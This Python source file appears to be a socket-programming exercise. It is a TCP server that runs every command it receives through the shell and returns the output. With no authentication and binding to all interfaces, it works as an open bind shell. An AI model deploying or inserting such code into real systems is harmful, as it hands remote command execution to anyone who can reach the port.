import socket
import subprocess

ip = ''
port = 22564
server = socket.socket()
server.bind((ip, port))
server.listen(5)

while True:
    print("server waiting...")
    conn, client_address = server.accept()
    while True:
        try:
            client_data = conn.recv(1024)
            if not client_data:
                print(client_address, "close connection!")
                break
            else:
                cmd = client_data.decode('utf-8')
                print(cmd)
                cmd_exec = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        except Exception:
            print(client_address, "close connection!")
            break
        cmd_result = cmd_exec.stdout.read()
        print(str(cmd_result))
        if not cmd_result:
            cmd_result = "cmd execution output is none!".encode('utf-8')
        cmd_result_len = "CMD_RESULT_SIZE|%s" % len(cmd_result)
        print(cmd_result_len)
        conn.send(cmd_result_len.encode('utf-8'))
        conn.recv(10)
        conn.send(cmd_result)
    conn.close()

